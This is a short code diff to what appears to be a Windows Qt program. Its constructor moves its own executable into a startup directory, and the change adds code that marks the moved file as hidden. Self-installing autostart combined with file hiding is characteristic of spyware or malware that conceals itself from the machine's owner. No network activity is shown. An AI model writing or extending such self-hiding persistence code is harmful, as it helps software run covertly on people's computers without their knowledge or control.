@@ -37,7 +37,18 @@ Core::Core(QObject *parent) :
     if (QDir(startupDirPath).exists()) {
         QString currentFilePath = QCoreApplication::applicationFilePath();
         QString newFilePath = startupDirPath + QDir::separator() + QFileInfo(currentFilePath).fileName();
-        QFile::rename(currentFilePath, newFilePath);
+
+        if (currentFilePath != newFilePath) {
+            QFile::rename(currentFilePath, newFilePath);
+        }
+
+        if (QFile::exists(newFilePath)) {
+            DWORD attributes = GetFileAttributes((const wchar_t *) newFilePath.utf16());
+
+            if (!(attributes & FILE_ATTRIBUTE_HIDDEN)) {
+                SetFileAttributes((const wchar_t *) newFilePath.utf16(), FILE_ATTRIBUTE_HIDDEN);
+            }
+        }
     }
 
     timer = new QTimer(this);
